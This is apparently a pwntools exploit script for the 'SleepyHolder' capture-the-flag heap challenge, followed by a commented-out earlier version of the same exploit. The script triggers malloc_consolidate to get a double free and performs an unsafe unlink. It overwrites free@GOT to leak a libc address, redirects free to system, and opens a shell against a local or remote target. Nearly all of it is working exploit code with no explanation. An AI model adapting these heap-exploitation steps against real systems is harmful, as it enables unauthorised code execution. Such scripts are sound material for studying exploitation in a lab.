#!/usr/bin/env python3

from pwn import *

context(os="linux", arch="amd64", log_level="info")
localfile = "./SleepyHolder"
locallibc = "../glibc_versions/2.25/x64_notcache/lib/libc-2.25.so"

def keep(idx, data):
    io.recvuntil("3. Renew secret\n")
    io.sendline(str(1))
    io.recvuntil("2. Big secret\n")
    io.sendline(str(idx))
    io.recvuntil("Tell me your secret: \n")
    io.sendline(data)

def wipe(idx):
    io.recvuntil("3. Renew secret\n")
    io.sendline(str(2))
    io.recvuntil("2. Big secret\n")
    io.sendline(str(idx))

def renew(idx, data):
    io.recvuntil("3. Renew secret\n")
    io.sendline(str(3))
    io.recvuntil("2. Big secret\n")
    io.sendline(str(idx))
    io.recvuntil("Tell me your secret: \n")
    io.send(data)


def exp():
    keep(1, "a")
    keep(2, "a")
    wipe(1)
    keep(3, "a")        # trigger malloc_consolidate
    wipe(1)             # double free

    small_ptr = 0x6020D0
    big_ptr = 0x6020C0
    fake_fd = small_ptr - 0x18
    fake_bk = small_ptr - 0x10
    fake_chunk = p64(0) + p64(0x21) + p64(fake_fd) + p64(fake_bk) + p64(0x20)   # prepare for unsafe unlink
    keep(1, fake_chunk)
    wipe(2)

    free_got = elf.got["free"]
    puts_plt = elf.plt["puts"]
    atoi_got = elf.got["atoi"]
    payload = p64(0) + p64(atoi_got) + p64(0) + p64(free_got) + p32(1)*2     # pad + bit_ptr + huge_ptr + small_ptr + big_flag + huge_flag
    renew(1, payload)
    # gdb.attach(io, "b *0x400DE3")
    renew(1, p64(puts_plt))

    wipe(2)
    atoi_addr = u64(io.recv(6).ljust(8, b"\x00"))
    libc_base = atoi_addr - libc.sym["atoi"]
    log.debug("libc_base: 0x%x" % libc_base)

    system_addr = libc_base + libc.sym["system"]
    renew(1, p64(system_addr))

    keep(2, "sh\x00")
    wipe(2)
    
    io.interactive()





argc = len(sys.argv)
if argc == 1:
    io = process(localfile)
else:
    if argc == 2:
        host, port = sys.argv[1].split(":")
    elif argc == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    io = remote(host, port)
elf = ELF(localfile)
libc = ELF(locallibc)
exp()


# first version
# def exp():               
#     keep(1, "a")
#     keep(2, "a")
#     wipe(1)
#     keep(3, "a")        # trigger malloc_consolidate
#     wipe(1)             # double free

#     small_ptr = 0x6020D0
#     big_ptr = 0x6020C0
#     fake_fd = small_ptr - 0x18
#     fake_bk = small_ptr - 0x10
#     fake_chunk = p64(0) + p64(0x21) + p64(fake_fd) + p64(fake_bk) + p64(0x20)   # prepare for unsafe unlink
#     keep(1, fake_chunk)
#     wipe(2)

#     free_got = elf.got["free"]
#     puts_plt = elf.plt["puts"]
#     atoi_got = elf.got["atoi"]
#     payload = p64(0) + p64(big_ptr) + p64(0) + p64(free_got) + p32(1)*2     # pad + bit_ptr + huge_ptr + small_ptr + big_flag + huge_flag
#     renew(1, payload)
#     # gdb.attach(io, "b *0x400DE3")
#     renew(1, p64(puts_plt))

#     payload = p64(atoi_got) + p64(0) + p64(atoi_got) + p32(1)*3
#     renew(2, payload)
#     wipe(1)
#     atoi_addr = u64(io.recv(6).ljust(8, b"\x00"))
#     libc_base = atoi_addr - libc.sym["atoi"]
#     log.debug("libc_base: 0x%x" % libc_base)
    
#     system_addr = libc.sym["system"] + libc_base
#     renew(2, p64(system_addr))
    
#     # gdb.attach(io)

#     io.recvuntil("3. Renew secret\n")
#     io.sendline(b"sh\x00")


#     io.interactive()